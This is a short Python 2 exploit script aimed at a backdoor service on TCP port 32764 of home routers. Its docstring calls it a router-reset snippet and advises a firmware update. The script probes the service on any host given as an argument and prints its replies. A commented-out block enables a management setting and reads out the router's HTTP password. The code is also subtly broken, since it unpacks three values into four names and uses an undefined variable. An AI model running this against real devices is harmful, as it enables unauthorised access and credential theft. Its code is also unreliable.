#!/usr/bin/python
"""
snippet code to reset your wireless router (cisco, tplink, dlink, some of brands router) 
update your firmware to avoid this kind of vulnerability
"""

import socket, struct, sys

HOST = sys.argv[1]
PORT = 32764

def send_message(s, message, payload=''):
    header = struct.pack('<III', 0x53634D4D, message, len(payload))
    s.send(header + payload)
    sig, ret, val, ret_len = struct.unpack('<III', s.recv(0xC))
    assert(sig == 0x53634D4D)
    if ret_val != 0:
        return ret_val, "ERROR"
    ret_str = ""
    while len(ret_str) < ret_len:
        ret_str += s.recv(ret_len - len(ret_str))
    return ret_val, ret_str

for message in xrange(1, 0xD):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((HOST, PORT))
        print "message: %d" % message
        r = send_message(s, message)
        print r[1].encode('string_escape')
    except:
        print 'failed'


"""
#delete comment sign to enable webmin panel
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
send_message(s, 3, "wlan_mgr_enable=1")
print send_message(s, 2, "http_password")[1]
"""
